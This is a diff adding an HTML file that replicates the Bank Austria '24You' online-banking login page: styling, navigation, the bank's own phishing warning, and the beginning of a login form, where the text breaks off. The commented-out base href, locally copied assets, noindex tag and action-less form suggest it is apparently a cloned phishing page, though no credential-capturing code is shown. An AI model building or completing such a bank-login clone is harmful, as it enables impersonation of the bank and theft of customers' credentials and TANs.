@@ -1,0 +1,1433 @@
+<!DOCTYPE html>
+<html translate="no" lang="en">
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+        <meta
+            http-equiv="Cache-control"
+            content="no-cache, no-store, must-revalidate" />
+        <meta http-equiv="Pragma" content="no-cache" />
+        <meta charset="utf-8" />
+        <meta name="robots" content="noindex" />
+        <title>Bank Austria</title>
+        <!-- base href="https://banking.bankaustria.at/" -->
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        <script
+            type="text/javascript"
+            src="files/ruxitagentjs_ICA27NVdfghijoqrux_10267230522124059.js"
+            data-dtconfig="rid=RID_1750180700|rpid=-875978693|domain=bankaustria.at|reportUrl=https://dynatrace.sgate.unicreditgroup.eu:443/bf/61dd03e5-69cf-4451-b134-fb538d479a5a|uam=1|app=53e23da225ca44e1|cors=1|featureHash=ICA27NVdfghijoqrux|vcv=2|rdnt=1|uxrgce=1|bp=3|cuc=524u9nvp|mel=100000|dpvc=1|md=mdcc1=a#DYNATRACE-CSS,mdcc2=a#DYNATRACE-SEPA-STEP3,mdcc3=a#DYNATRACE-SEPA-STEP2,mdcc4=a#DYNATRACE-SEPA-STEP1,mdcc5=a#DYNATRACE-CSS|ssv=4|lastModification=1694944578843|tp=500,50,0,1|agentUri=/ruxitagentjs_ICA27NVdfghijoqrux_10267230522124059.js"></script>
+        <link
+            rel="icon"
+            type="image/png"
+            href="https://login.bankaustria.at/assets/favicon.ico" />
+        <link
+            rel="stylesheet"
+            href="files/styles.784a1ee08c2d3dba8753.css" />
+        <style></style>
+        <style>
+            .horizontalCenter[_ngcontent-lqg-c29] {
+                display: table;
+                position: relative;
+                margin-left: auto;
+                margin-right: auto;
+                box-sizing: border-box;
+                height: 100%;
+            }
+            .verticalCenter[_ngcontent-lqg-c29] {
+                display: table-cell;
+                vertical-align: middle;
+            }
+            .centerContent[_ngcontent-lqg-c29],
+            .verticalCenter[_ngcontent-lqg-c29] {
+                position: relative;
+                text-align: center;
+            }
+            .centerContent[_ngcontent-lqg-c29] {
+                height: 120px;
+                width: 100%;
+            }
+            .centerContent[_ngcontent-lqg-c29],
+            .loadingSpinner[_ngcontent-lqg-c29] {
+                display: block;
+                box-sizing: border-box;
+            }
+            .loadingSpinner[_ngcontent-lqg-c29] {
+                margin: auto;
+                height: 100px;
+                width: 100px;
+                border: 2px solid rgba(0, 174, 208, 0.4);
+                border-radius: 75px;
+                position: relative;
+                background: url(https://login.bankaustria.at/spinner.0f047083ede76d7b4812.gif)
+                    50% no-repeat;
+            }
+            .loadingDescription[_ngcontent-lqg-c29] {
+                width: 100%;
+                display: none;
+                position: relative;
+                text-align: center;
+                box-sizing: border-box;
+                color: #00aed0;
+                font-size: 24px;
+            }
+            .loadingDescription.loadingDescriptionBlock[_ngcontent-lqg-c29] {
+                display: block;
+            }
+        </style>
+        <img src="files/121-icon01.png" />
+        <style>
+            .t4y-navbar[_ngcontent-lqg-c28] {
+                display: block;
+                box-sizing: border-box;
+                float: left;
+                width: 100%;
+                color: #bebebe;
+                cursor: pointer;
+            }
+            .t4y-navbar[_ngcontent-lqg-c28] .navbar-item[_ngcontent-lqg-c28] {
+                height: 80px;
+                border-left: 3px solid transparent;
+                border-bottom: 1px solid hsla(0, 0%, 40%, 0.16);
+                box-sizing: border-box;
+            }
+            .t4y-navbar[_ngcontent-lqg-c28]
+                .navbar-item[_ngcontent-lqg-c28]:focus,
+            .t4y-navbar[_ngcontent-lqg-c28]
+                .navbar-item[_ngcontent-lqg-c28]:hover {
+                background-color: #262626;
+                border-left: 3px solid #fff;
+            }
+            .t4y-navbar[_ngcontent-lqg-c28] .item-icon[_ngcontent-lqg-c28] {
+                max-width: 74px;
+                font-size: 2.3em;
+                text-align: center;
+            }
+            .t4y-navbar[_ngcontent-lqg-c28] .item-icon[_ngcontent-lqg-c28],
+            .t4y-navbar[_ngcontent-lqg-c28] .item-label[_ngcontent-lqg-c28] {
+                box-sizing: border-box;
+                display: inline-block;
+                width: 100%;
+                vertical-align: middle;
+            }
+            .t4y-navbar[_ngcontent-lqg-c28] .item-label[_ngcontent-lqg-c28] {
+                text-transform: uppercase;
+            }
+            .t4y-navbar.closing[_ngcontent-lqg-c28] {
+                animation: openNavbarAnimation 0.5s linear forwards;
+                animation-direction: reverse;
+            }
+            .t4y-navbar.opening[_ngcontent-lqg-c28] {
+                animation: openNavbarAnimation 0.5s linear forwards;
+            }
+            .t4y-navbar.close[_ngcontent-lqg-c28],
+            .t4y-navbar.closing[_ngcontent-lqg-c28],
+            .t4y-navbar.opening[_ngcontent-lqg-c28] {
+                max-width: 80px;
+                border-right: 3px solid transparent;
+            }
+            .t4y-navbar.close[_ngcontent-lqg-c28]
+                .navbar-item-container[_ngcontent-lqg-c28],
+            .t4y-navbar.closing[_ngcontent-lqg-c28]
+                .navbar-item-container[_ngcontent-lqg-c28],
+            .t4y-navbar.opening[_ngcontent-lqg-c28]
+                .navbar-item-container[_ngcontent-lqg-c28] {
+                display: table;
+                max-width: 74px;
+                width: 100%;
+            }
+            .t4y-navbar.close[_ngcontent-lqg-c28]
+                .navbar-item-container[_ngcontent-lqg-c28]
+                .navbar-item[_ngcontent-lqg-c28],
+            .t4y-navbar.closing[_ngcontent-lqg-c28]
+                .navbar-item-container[_ngcontent-lqg-c28]
+                .navbar-item[_ngcontent-lqg-c28],
+            .t4y-navbar.opening[_ngcontent-lqg-c28]
+                .navbar-item-container[_ngcontent-lqg-c28]
+                .navbar-item[_ngcontent-lqg-c28] {
+                display: table-cell;
+                vertical-align: middle;
+            }
+            .t4y-navbar.close[_ngcontent-lqg-c28]
+                .navbar-item-container[_ngcontent-lqg-c28]
+                .navbar-item[_ngcontent-lqg-c28]
+                .item-label[_ngcontent-lqg-c28],
+            .t4y-navbar.closing[_ngcontent-lqg-c28]
+                .navbar-item-container[_ngcontent-lqg-c28]
+                .navbar-item[_ngcontent-lqg-c28]
+                .item-label[_ngcontent-lqg-c28],
+            .t4y-navbar.opening[_ngcontent-lqg-c28]
+                .navbar-item-container[_ngcontent-lqg-c28]
+                .navbar-item[_ngcontent-lqg-c28]
+                .item-label[_ngcontent-lqg-c28] {
+                text-align: center;
+                font-size: 0.75em;
+            }
+            .navbar-item {
+              display: flex !important;
+            }
+            .navbar-item .item-label {
+              margin-top: auto;
+              margin-bottom: auto;
+              height: fit-content;
+            }
+            .t4y-navbar.open[_ngcontent-lqg-c28] {
+                max-width: 280px;
+            }
+            .t4y-navbar.open[_ngcontent-lqg-c28]
+                .item-icon[_ngcontent-lqg-c28] {
+                height: inherit;
+                display: inline-table;
+                border-right: 3px solid transparent;
+            }
+            .t4y-navbar.open[_ngcontent-lqg-c28]
+                .item-icon[_ngcontent-lqg-c28]:before {
+                display: table-cell;
+                vertical-align: middle;
+            }
+            .t4y-navbar.open[_ngcontent-lqg-c28]
+                .item-label[_ngcontent-lqg-c28] {
+                max-width: 200px;
+                font-family: unicredit-light;
+                font-size: 1.25em;
+                text-align: right;
+                padding: 0 0.75em;
+            }
+            @keyframes openNavbarAnimation {
+                to {
+                    max-width: 280px;
+                }
+            }
+        </style>
+        <style>
+            .link-style[_ngcontent-lqg-c34] a[_ngcontent-lqg-c34] {
+                font-weight: 400;
+                text-decoration: underline;
+                cursor: pointer;
+                color: #00afd0;
+                font-family: unicredit-regular;
+                font-size: 14px;
+                text-decoration: none;
+            }
+            [_nghost-lqg-c34] {
+                display: block;
+            }
+            .verifyCredentialLoader[_ngcontent-lqg-c34] {
+                position: fixed;
+            }
+            .verifyCredentialHeader[_ngcontent-lqg-c34] {
+                display: block;
+                position: relative;
+                width: 100%;
+            }
+            .verifycredentialmainspanel[_ngcontent-lqg-c34] {
+                display: block;
+                font-size: 20px;
+                margin-left: auto;
+                margin-right: auto;
+                max-width: 430px;
+                position: relative;
+            }
+            .verifyMessages[_ngcontent-lqg-c34] {
+                width: 100%;
+                min-width: 200px;
+                display: block;
+                max-width: 380px;
+                margin: auto auto 20px;
+            }
+            .userinputs[_ngcontent-lqg-c34] {
+                position: relative;
+                display: block;
+                width: 100%;
+            }
+            .userinputwithinfo[_ngcontent-lqg-c34] {
+                box-sizing: border-box;
+                display: block;
+                height: 80px;
+                margin: auto;
+                text-align: center;
+                width: 100%;
+            }
+            .userinputwithinfo.userid-container[_ngcontent-lqg-c34] {
+                margin-bottom: 5px;
+            }
+            .userinputwithinfo[_ngcontent-lqg-c34]
+                .userinput[_ngcontent-lqg-c34] {
+                box-sizing: border-box;
+                width: 100%;
+                min-width: 200px;
+                display: block;
+                max-width: 380px;
+                background-clip: padding-box;
+                text-align: center;
+                margin: auto;
+            }
+            .userinputwithinfo[_ngcontent-lqg-c34]
+                .credentialinfocontainer[_ngcontent-lqg-c34] {
+                position: absolute;
+                box-sizing: border-box;
+                display: inline-table;
+                height: 60px;
+                left: 100%;
+                transform: translateY(-60px);
+            }
+            .userinputwithinfo[_ngcontent-lqg-c34]
+                .credentialinfocontainer[_ngcontent-lqg-c34]
+                .credentialinfo[_ngcontent-lqg-c34] {
+                display: table-cell;
+                float: none;
+                vertical-align: middle;
+            }
+            .postUserinputInfoPanel[_ngcontent-lqg-c34] {
+                display: block;
+                position: relative;
+                min-width: 300px;
+                max-width: 380px;
+                text-align: left;
+                margin: auto;
+            }
+            .link-style[_ngcontent-lqg-c34] a[_ngcontent-lqg-c34]:hover,
+            .postUserinputInfoPanel[_ngcontent-lqg-c34] {
+                text-decoration: underline;
+            }
+            .loginButtonContainer[_ngcontent-lqg-c34] {
+                width: 100%;
+                margin-bottom: 20px;
+                margin-top: 30px;
+            }
+            .loginButton[_ngcontent-lqg-c34] {
+                display: block;
+                float: none;
+                margin: 30px auto 20px;
+                max-width: 130px;
+                min-width: 50px;
+            }
+            .securityMessagePanel[_ngcontent-lqg-c34] {
+                color: #00afd0;
+                display: block;
+                font-size: 16px;
+                font-family: unicredit-medium;
+                position: relative;
+                text-align: center;
+                z-index: 2;
+            }
+            .securityMessagePanel[_ngcontent-lqg-c34]
+                > .showSecurityDetails[_ngcontent-lqg-c34] {
+                cursor: pointer;
+                display: block;
+                font-size: 14px;
+                text-decoration: underline;
+            }
+            .hiddenSecurityDetailsPanel[_ngcontent-lqg-c34] {
+                background-color: #ccecea;
+                border-bottom: 1px solid #00a197;
+                border-top: 1px solid #00a197;
+                color: #00a197;
+                font-family: unicredit-medium;
+                margin: 10px;
+                padding: 14px;
+                position: relative;
+            }
+            .hiddenSecurityDetailsPanel[_ngcontent-lqg-c34]
+                .securityDetailsPanel[_ngcontent-lqg-c34]:after,
+            .hiddenSecurityDetailsPanel[_ngcontent-lqg-c34]
+                .securityDetailsPanel[_ngcontent-lqg-c34]:before {
+                border: 10px solid transparent;
+                border-bottom-color: #ccecea;
+                content: '';
+                left: 50%;
+                position: absolute;
+                transform: translateX(-10px);
+                z-index: 1;
+            }
+            .hiddenSecurityDetailsPanel[_ngcontent-lqg-c34]
+                .securityDetailsPanel[_ngcontent-lqg-c34]:before {
+                border-color: transparent transparent #00a197;
+                bottom: 101%;
+            }
+            .hiddenSecurityDetailsPanel[_ngcontent-lqg-c34]
+                .securityDetailsPanel[_ngcontent-lqg-c34]:after {
+                border-color: transparent transparent #ccecea;
+                bottom: 99%;
+            }
+            .managelanguage-from-login[_ngcontent-lqg-c34] {
+                text-align: center;
+                width: 100%;
+                margin-bottom: 20px;
+                margin-top: 30px;
+            }
+        </style>
+        <style>
+            input[_ngcontent-lqg-c27],
+            input[type='password'][_ngcontent-lqg-c27] {
+                font-family: unicredit-light;
+                font-size: 20px;
+                box-sizing: border-box;
+                text-align: inherit;
+                margin: 0;
+                font-weight: 400;
+                outline: medium none;
+                display: block;
+                height: 100%;
+                width: 100%;
+                line-height: normal;
+                box-shadow: none !important;
+                border: 1px solid #ccc;
+                color: #666;
+                background-clip: padding-box;
+                border-radius: 5px;
+                padding: 0 4%;
+            }
+            input.error-message[_ngcontent-lqg-c27],
+            input[type='password'].error-message[_ngcontent-lqg-c27] {
+                background-color: #ffebea;
+                border-color: red;
+            }
+            input.error-message[_ngcontent-lqg-c27]:focus,
+            input[type='password'].error-message[_ngcontent-lqg-c27]:focus {
+                background-color: #e5eff2;
+            }
+            input.info-message[_ngcontent-lqg-c27],
+            input[type='password'].info-message[_ngcontent-lqg-c27] {
+                border-color: #4e964e;
+            }
+            input.warning-message[_ngcontent-lqg-c27],
+            input[type='password'].warning-message[_ngcontent-lqg-c27] {
+                border-color: #eaad24;
+            }
+            .message-box[_ngcontent-lqg-c27] {
+                display: none;
+                box-sizing: border-box;
+                width: 100%;
+                margin-top: 10px;
+                position: relative;
+                font-size: 16px;
+                text-align: left;
+                color: #fff;
+                border-radius: 4px;
+                z-index: 2;
+                min-width: 120px;
+                left: 0;
+                top: 0;
+                min-height: 50px;
+                padding: 8px;
+            }
+            .message-box.error-message[_ngcontent-lqg-c27] {
+                background-color: #ea5c4d;
+            }
+            .message-box.info-message[_ngcontent-lqg-c27] {
+                background-color: #4e964e;
+            }
+            .message-box.warning-message[_ngcontent-lqg-c27] {
+                background-color: #eaad24;
+            }
+            .message-box.no-message[_ngcontent-lqg-c27],
+            .message-box.no-message.show[_ngcontent-lqg-c27] {
+                display: none;
+            }
+            .message-box.show[_ngcontent-lqg-c27] {
+                display: block;
+            }
+            .message-box[_ngcontent-lqg-c27]:after {
+                content: ' ';
+                height: 0;
+                width: 0;
+                position: absolute;
+                pointer-events: none;
+                border: 11px solid transparent;
+                margin-top: -10px;
+                left: 10px;
+                top: -10px;
+            }
+            .message-box.warning-message[_ngcontent-lqg-c27]:after {
+                border-color: transparent transparent #eaad24;
+            }
+            .message-box.error-message[_ngcontent-lqg-c27]:after {
+                border-color: transparent transparent #ea5c4d;
+            }
+            .message-box.info-message[_ngcontent-lqg-c27]:after {
+                border-color: transparent transparent #4e964e;
+            }
+        </style>
+        <style>
+            .t4y-infotip-span[_ngcontent-lqg-c31] {
+                position: relative;
+                background-image: url(https://login.bankaustria.at/ico-infologin.053916b87369ee8dcb7c.png);
+                float: left;
+                background-repeat: no-repeat;
+                cursor: pointer;
+                display: block;
+                width: 26px;
+                height: 26px;
+                color: #999;
+            }
+            .t4y-infotip-span.active[_ngcontent-lqg-c31] {
+                background-image: url(https://login.bankaustria.at/ico-infologin_b.48366806828f8745f4c7.png);
+            }
+            .t4y-infotip-span[_ngcontent-lqg-c31]
+                .t4y-infotip-text[_ngcontent-lqg-c31] {
+                background-color: #fff;
+                border: 1px solid rgba(0, 0, 0, 0.2);
+                border-radius: 6px;
+                cursor: default;
+                font-family: unicredit-regular;
+                font-size: 14px;
+                left: 100%;
+                margin-left: 20px;
+                max-width: 276px;
+                padding: 10px;
+                position: relative;
+                box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
+                text-align: left;
+                top: 50%;
+                transform: translateY(-50%);
+                z-index: 1;
+                width: 100vh;
+                float: left;
+            }
+            .t4y-infotip-span[_ngcontent-lqg-c31]
+                .t4y-infotip-text[_ngcontent-lqg-c31]:after,
+            .t4y-infotip-span[_ngcontent-lqg-c31]
+                .t4y-infotip-text[_ngcontent-lqg-c31]:before {
+                border-style: solid;
+                border-width: 10px;
+                content: '';
+                margin-top: -10px;
+                position: absolute;
+                right: 100%;
+                top: 50%;
+            }
+            .t4y-infotip-span[_ngcontent-lqg-c31]
+                .t4y-infotip-text[_ngcontent-lqg-c31]:before {
+                border-color: transparent rgba(0, 0, 0, 0.2) transparent
+                    transparent;
+            }
+            .t4y-infotip-span[_ngcontent-lqg-c31]
+                .t4y-infotip-text[_ngcontent-lqg-c31]:after {
+                border-color: transparent #fff transparent transparent;
+                right: 99.5%;
+            }
+        </style>
+        <style>
+            button[_ngcontent-lqg-c32] {
+                cursor: pointer;
+                font-family: unicredit-medium;
+                font-size: 14px;
+                border: 1px solid #00afd0;
+                background-color: #00afd0;
+                color: #fff;
+                border-radius: 3px;
+                display: inline-block;
+                line-height: 38px;
+                height: 100%;
+                text-align: center;
+                text-transform: uppercase;
+                padding: 0 20px;
+                width: 100%;
+                margin: 0;
+            }
+            button.backbutton[_ngcontent-lqg-c32] {
+                border: 1px solid #ccc;
+                background-color: transparent;
+                color: #666;
+                white-space: nowrap;
+            }
+            button[_ngcontent-lqg-c32] span[_ngcontent-lqg-c32] {
+                display: inline;
+                padding: 0;
+                line-height: 1.4;
+            }
+        </style>
+        <style>
+            .lang-manage-container[_ngcontent-lqg-c33] {
+                display: inline-block;
+                font-size: 14px;
+                font-family: unicredit-regular;
+                margin-left: 20px;
+            }
+            .lang-manage-container[_ngcontent-lqg-c33]
+                .language-label[_ngcontent-lqg-c33] {
+                color: #00afd0;
+                display: inline-block;
+                font-size: 1.6rem;
+                margin-top: 13px;
+                padding-right: 22px;
+                text-transform: uppercase;
+                vertical-align: top;
+            }
+            .lang-manage-container[_ngcontent-lqg-c33]
+                .item[_ngcontent-lqg-c33] {
+                cursor: pointer;
+                display: inline-block;
+                margin-right: 20px;
+                width: 39px;
+            }
+            .lang-manage-container[_ngcontent-lqg-c33]
+                .item.active[_ngcontent-lqg-c33]
+                .flag[_ngcontent-lqg-c33] {
+                background-position: 0 0;
+                border: 2px solid #00afd0;
+            }
+            .lang-manage-container[_ngcontent-lqg-c33]
+                .item.active[_ngcontent-lqg-c33]
+                .label[_ngcontent-lqg-c33] {
+                color: #00afd0;
+            }
+            .lang-manage-container[_ngcontent-lqg-c33]
+                .item[_ngcontent-lqg-c33]
+                .flag[_ngcontent-lqg-c33] {
+                background-repeat: no-repeat;
+                background-position: 0 100%;
+                border: 2px solid #fff;
+                border-radius: 50%;
+                box-sizing: content-box;
+                display: block;
+                height: 39px;
+                width: 39px;
+            }
+            .lang-manage-container[_ngcontent-lqg-c33]
+                .item[_ngcontent-lqg-c33]
+                .flag.en[_ngcontent-lqg-c33] {
+                background-image: url(https://login.bankaustria.at/sprite-lang-en.710420b130f6d415cd2d.png);
+            }
+            .lang-manage-container[_ngcontent-lqg-c33]
+                .item[_ngcontent-lqg-c33]
+                .flag.de[_ngcontent-lqg-c33] {
+                background-image: url(https://login.bankaustria.at/sprite-lang-at.0b5293ce47991ab4293d.png);
+            }
+            .lang-manage-container[_ngcontent-lqg-c33]
+                .item[_ngcontent-lqg-c33]
+                .label[_ngcontent-lqg-c33] {
+                color: #333;
+                cursor: pointer;
+                display: block;
+                font-family: unicredit-medium, Helvetica, Arial, sans-serif;
+                font-size: 10.5px;
+                font-weight: 400;
+                margin-top: 5px;
+                text-align: center;
+            }
+            .settings-list-style2-inner[_ngcontent-lqg-c33]
+                .managelanguage-from-login[_ngcontent-lqg-c33]
+                .lang-manage-container[_ngcontent-lqg-c33] {
+                margin-left: -22px;
+            }
+            .t4y-login-content-container {
+              padding-top: 60px !important;
+            }
+            .t4y-login-header-container {
+              top: 0;
+              position: fixed;
+              z-index: 999999;
+            }
+        </style>
+    </head>
+    <body>
+        <t4y-login-app-root _nghost-lqg-c26="" ng-version="10.1.6"
+            ><div _ngcontent-lqg-c26="" class="appPanel">
+                <router-outlet _ngcontent-lqg-c26=""></router-outlet
+                ><t4y-login _nghost-lqg-c45=""
+                    ><div
+                        _ngcontent-lqg-c45=""
+                        class="t4y-login-header-container">
+                        <div _ngcontent-lqg-c45="" class="navbar-toggle-button">
+                            <div
+                                _ngcontent-lqg-c45=""
+                                class="logo-home-at-container">
+                                <div
+                                    _ngcontent-lqg-c45=""
+                                    class="showSidebar private">
+                                    
+                                    <img
+                                    src="files/menu.png"
+                                    alt="" 
+                                    width="100%"/>
+                                </div>
+                                <div _ngcontent-lqg-c45="" class="logo-home">
+                                    <a
+                                        _ngcontent-lqg-c45=""
+                                        href="https://www.bankaustria.at/en/index.jsp"
+                                        target="_blank"></a>
+                                        <img
+                                            src="files/logo.png"
+                                            alt="" 
+                                            width="100%"/>
+                                        ></a
+                                    >
+                                </div>
+                            </div>
+                        </div>
+                        <div _ngcontent-lqg-c45="" class="t4y-login-header">
+                            <header class="cabecera no-login">
+                                <div class="logo-home">
+                                    <a
+                                        style="display: inline"
+                                        href="#"
+                                        title=""
+                                        class="showSidebar private">
+                                        <div class="labelFade">MENU</div></a
+                                    >
+                                    <a
+                                        style="display: none"
+                                        href="#"
+                                        title=""
+                                        class="closeSidebar private">
+                                        <div class="labelFade">MENU</div></a
+                                    >
+                                    <a
+                                        href="https://www.bankaustria.at/"
+                                        target="_blank"
+                                        title=""
+                                        ><img
+                                            src="files/BAMofUC-logo-flat.svg"
+                                            style="
+                                                width: 186px;
+                                            "
+                                            title="logo"
+                                            alt="logo"
+                                    /></a>
+                                </div>
+                                <div class="header-search center"></div>
+                                <div class="box-elementi-header for-login-at">
+                                    <a
+                                        href="http://www.bankaustria.at/privatkunden.jsp"
+                                        target="_blank"
+                                        title=""
+                                        class="header-notification-box-at ico-box-notification-privatecustomers"
+                                        style="display: inline-block">
+                                        <span
+                                            class="notification total-message"></span>
+                                        <span
+                                            class="header-notification-label"
+                                            style="font-size: 14px"
+                                            >Privatkunden</span
+                                        >
+                                    </a>
+                                    <a
+                                        href="http://www.bankaustria.at/firmenkunden-und-freie-berufe.jsp"
+                                        target="_blank"
+                                        title=""
+                                        class="header-notification-box-at ico-box-notification-largebusiness"
+                                        style="display: inline-block">
+                                        <span
+                                            class="notification total-message"></span>
+                                        <span
+                                            class="header-notification-label"
+                                            style="font-size: 14px"
+                                            >Firmenkunden</span
+                                        >
+                                    </a>
+                                    <a
+                                        href="http://www.bankaustria.at/private-banking.jsp"
+                                        target="_blank"
+                                        title=""
+                                        class="header-notification-box-at ico-box-notification-privatebanking"
+                                        style="display: inline-block">
+                                        <span
+                                            class="notification total-message"></span>
+                                        <span
+                                            class="header-notification-label"
+                                            style="font-size: 14px"
+                                            >Private Banking</span
+                                        >
+                                    </a>
+                                    <a
+                                        href="http://www.bankaustria.at/ueber-uns.jsp"
+                                        target="_blank"
+                                        title=""
+                                        class="header-notification-box-at ico-box-notification-aboutus"
+                                        style="display: inline-block">
+                                        <span
+                                            class="notification total-message"></span>
+                                        <span
+                                            class="header-notification-label"
+                                            style="font-size: 14px"
+                                            >Über uns</span
+                                        >
+                                    </a>
+                                </div>
+                            </header>
+                        </div>
+                    </div>
+                    <!---->
+                    <div
+                        _ngcontent-lqg-c45=""
+                        class="t4y-login-content-container show-structure-wcm">
+                        <div
+                            _ngcontent-lqg-c45=""
+                            class="t4y-login-sidebar-wrapper">
+                            <t4y-login-navbar
+                                _ngcontent-lqg-c45=""
+                                _nghost-lqg-c28=""
+                                ><nav
+                                    _ngcontent-lqg-c28=""
+                                    class="t4y-navbar open">
+                                    <div
+                                        _ngcontent-lqg-c28=""
+                                        class="navbar-item-container">
+                                        <div
+                                            _ngcontent-lqg-c28=""
+                                            class="navbar-item">
+                                            <div
+                                                _ngcontent-lqg-c28=""
+                                                class="item-icon ico ico-iw2mono-conti"></div>
+                                            <div
+                                                _ngcontent-lqg-c28=""
+                                                class="item-label">
+                                                Girokonten
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div
+                                        _ngcontent-lqg-c28=""
+                                        class="navbar-item-container">
+                                        <div
+                                            _ngcontent-lqg-c28=""
+                                            class="navbar-item">
+                                            <div
+                                                _ngcontent-lqg-c28=""
+                                                class="item-icon ico ico-iw2mono-carte"></div>
+                                            <div
+                                                _ngcontent-lqg-c28=""
+                                                class="item-label">
+                                                Kreditkarten
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div
+                                        _ngcontent-lqg-c28=""
+                                        class="navbar-item-container">
+                                        <div
+                                            _ngcontent-lqg-c28=""
+                                            class="navbar-item">
+                                            <div
+                                                _ngcontent-lqg-c28=""
+                                                class="item-icon ico ico-iw2mono-sponsorship"></div>
+                                            <div
+                                                _ngcontent-lqg-c28=""
+                                                class="item-label">
+                                                Sparprodukte
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div
+                                        _ngcontent-lqg-c28=""
+                                        class="navbar-item-container">
+                                        <div
+                                            _ngcontent-lqg-c28=""
+                                            class="navbar-item">
+                                            <div
+                                                _ngcontent-lqg-c28=""
+                                                class="item-icon ico ico-iw2mono-prestiti"></div>
+                                            <div
+                                                _ngcontent-lqg-c28=""
+                                                class="item-label">
+                                                Finanzierung
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div
+                                        _ngcontent-lqg-c28=""
+                                        class="navbar-item-container">
+                                        <div
+                                            _ngcontent-lqg-c28=""
+                                            class="navbar-item">
+                                            <div
+                                                _ngcontent-lqg-c28=""
+                                                class="item-icon ico ico-iw2mono-investimenti"></div>
+                                            <div
+                                                _ngcontent-lqg-c28=""
+                                                class="item-label">
+                                                Wertpapiere
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div
+                                        _ngcontent-lqg-c28=""
+                                        class="navbar-item-container">
+                                        <div
+                                            _ngcontent-lqg-c28=""
+                                            class="navbar-item">
+                                            <div
+                                                _ngcontent-lqg-c28=""
+                                                class="item-icon ico ico-iw2mono-estero"></div>
+                                            <div
+                                                _ngcontent-lqg-c28=""
+                                                class="item-label">
+                                                Börsen &amp; Märkte
+                                            </div>
+                                        </div>
+                                    </div>
+                                </nav></t4y-login-navbar
+                            >
+                        </div>
+                        <!----><!---->
+                        <div
+                            _ngcontent-lqg-c45=""
+                            class="t4y-login-content-wrapper">
+                            <div
+                                _ngcontent-lqg-c45=""
+                                class="t4y-login-content">
+                                <t4y-verify-credentials
+                                    _ngcontent-lqg-c45=""
+                                    _nghost-lqg-c34=""
+                                    ><t4y-loader
+                                        _ngcontent-lqg-c34=""
+                                        class="verifyCredentialLoader"
+                                        _nghost-lqg-c29=""
+                                        style="opacity: 0.8; display: none"
+                                        ><div
+                                            _ngcontent-lqg-c29=""
+                                            class="horizontalCenter">
+                                            <div
+                                                _ngcontent-lqg-c29=""
+                                                class="verticalCenter">
+                                                <div
+                                                    _ngcontent-lqg-c29=""
+                                                    class="centerContent">
+                                                    <div
+                                                        _ngcontent-lqg-c29=""
+                                                        class="loadingSpinner"></div>
+                                                    <div
+                                                        _ngcontent-lqg-c29=""
+                                                        class="loadingDescription loadingDescriptionBlock">
+                                                        Bitte warten …
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div></t4y-loader
+                                    ><!---->
+                                    <div
+                                        _ngcontent-lqg-c34=""
+                                        class="verify-credential-container">
+                                        <div
+                                            _ngcontent-lqg-c34=""
+                                            class="verifyCredentialHeader">
+                                            <div
+                                                _ngcontent-lqg-c34=""
+                                                class="login_header_text info-box-lightblueBg">
+                                                <span _ngcontent-lqg-c34=""
+                                                    ><div>
+                                                        <div
+                                                            class="unicredit-regular text-left content-md-bottom-padding-wrapper content-top-padding-wrapper">
+                                                            <h1
+                                                                style="
+                                                                    text-align: center;
+                                                                    font-family: unicredit-medium;
+                                                                    margin-bottom: 10px;
+                                                                ">
+                                                                <span
+                                                                    style="
+                                                                        color: #e2001a;
+                                                                    "
+                                                                    ><span
+                                                                        class="header1"
+                                                                        ><b
+                                                                            >24You</b
+                                                                        ></span
+                                                                    ></span
+                                                                >
+                                                            </h1>
+                                                        </div>
+                                                    </div>
+                                                    <div class="info-box">
+                                                        <div
+                                                            class="inner-info-box">
+                                                            <div
+                                                                class="info-box text-left"
+                                                                style="
+                                                                    margin-bottom: -10px;
+                                                                ">
+                                                                <h3
+                                                                    style="
+                                                                        text-align: center;
+                                                                    ">
+                                                                    <span
+                                                                        style="
+                                                                            color: #666666;
+                                                                        "
+                                                                        ><p>
+                                                                            Warnung:
+                                                                            Derzeit
+                                                                            versenden
+                                                                            Betrüger
+                                                                            Phishing-Mails
+                                                                            bei
+                                                                            denen
+                                                                            Ihnen
+                                                                            eine
+                                                                            Login-Aufforderung
+                                                                            der
+                                                                            Bank
+                                                                            Austria
+                                                                            vorgegaukelt
+                                                                            wird.
+                                                                        </p>
+                                                                        <p>
+                                                                            Folgen
+                                                                            Sie
+                                                                            keinen
+                                                                            Login-Links,
+                                                                            die
+                                                                            Sie
+                                                                            per
+                                                                            E-Mail
+                                                                            oder
+                                                                            per
+                                                                            SMS
+                                                                            erhalten!
+                                                                            Bitte
+                                                                            lesen
+                                                                            Sie
+                                                                            vor
+                                                                            der
+                                                                            Eingabe
+                                                                            einer
+                                                                            TAN
+                                                                            den
+                                                                            Text
+                                                                            der
+                                                                            gesamten
+                                                                            TAN-Nachricht
+                                                                            sorgfältig!
+                                                                        </p>
+                                                                        Sie&nbsp;befürchten,
+                                                                        Opfer
+                                                                        dieses
+                                                                        Betruges
+                                                                        zu sein?
+                                                                        Rufen
+                                                                        Sie&nbsp;zu
+                                                                        Ihrer
+                                                                        eigenen
+                                                                        Sicherheit&nbsp;umgehend
+                                                                        das Bank
+                                                                        Austria&nbsp;Sicherheitscenter
+                                                                        unter
+                                                                        der
+                                                                        Rufnummer
+                                                                        050505-26105
+                                                                        an.</span
+                                                                    >
+                                                                </h3>
+                                                            </div>
+                                                        </div>
+                                                    </div></span
+                                                >
+                                            </div>
+                                        </div>
+                                        <form>
+                                            <div
+                                                _ngcontent-lqg-c34=""
+                                                class="verifycredentialmainspanel">
+                                                <div
+                                                    _ngcontent-lqg-c34=""
+                                                    class="userinputs">
+                                                    <t4y-message
+                                                        _ngcontent-lqg-c34=""
+                                                        class="verifyMessages"
+                                                        _nghost-lqg-c30=""
+                                                        ><!----></t4y-message
+                                                    >
+                                                    <div
+                                                        _ngcontent-lqg-c34=""
